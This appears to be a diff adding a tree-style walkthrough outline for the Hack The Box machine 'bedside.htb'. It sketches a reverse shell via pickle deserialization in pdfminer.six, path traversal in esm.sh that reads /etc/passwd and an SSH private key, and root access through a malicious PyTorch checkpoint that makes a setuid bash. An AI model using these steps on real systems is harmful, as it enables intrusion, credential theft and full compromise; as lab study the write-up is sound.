@@ -1,0 +1,44 @@
+```
+Machine-IP (bedside.htb / research.bedside.htb)      attacker: Your-IP
+│
+├── Recon
+│   ├── nmap: 22 (ssh), 80 (http → bedside.htb), 3000 (filtered)
+│   └── vhost fuzz: research.bedside.htb  ── "Bedside Research Portal" (PDF upload)
+│
+├── [1] CVE-2025-64512 — pdfminer.six CMapDB pickle deserialization
+│   │   target: http://research.bedside.htb/
+│   │
+│   ├── upload payload.pickle.gz  (os.system → bash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1)
+│   ├── upload trigger.pdf        (/Encoding → path of uploaded pickle, hex-escaped)
+│   └── pdf_watcher.py runs pdf2txt.py on trigger.pdf
+│       └── CMapDB._load_data() unpickles payload.pickle.gz
+│           └── RCE as datawrangler  (listener: nc -lvnp 4444 on kali)
+│
+├── [2] CVE-2025-59341 — esm.sh path traversal (LFI)
+│   │   from: datawrangler@10.129.41.47, target: http://localhost:3000/
+│   │
+│   ├── curl --path-as-is http://localhost:3000/../../../../etc/passwd
+│   │   └── reveals users: developer (1000), datawrangler (988, dataops)
+│   └── curl --path-as-is http://localhost:3000/../../../../home/developer/.ssh/id_rsa
+│       └──  developer's SSH private key
+│           └── ssh -i developer_id_rsa developer@bedside.htb
+│               └──  user.txt
+│
+└── [3] MONAI/PyTorch checkpoint pickle deserialization (torch.load)
+    │   sudo rule: developer → NOPASSWD /usr/bin/python3 /opt/trainer/bedside_trainer.py
+    │
+    ├── as datawrangler: clear /datastore/{staging,processed}/*.txt
+    ├── as datawrangler: write /datastore/processed/valid.png   (loader needs 1 valid sample)
+    ├── as datawrangler: write /datastore/checkpoints/evil.pt
+    │   └── zip-wrapped pickle: {"model": RCE(), "optimizer": RCE()}
+    │       └── __reduce__ → os.system('cp /bin/bash ...; chmod +s ...')
+    │
+    ├── as developer: sudo python3 bedside_trainer.py
+    │   └── CheckpointLoader → torch.load(evil.pt) → unpickle →  os.system() as root
+    │
+    ├── ⚠ /tmp is mounted nosuid — setuid bash written there doesn't escalate
+    │   └── fix: write setuid payload to /home/developer/ instead (not nosuid)
+    │
+    └── /home/developer/rootbash -p
+        └──  root.txt
+```
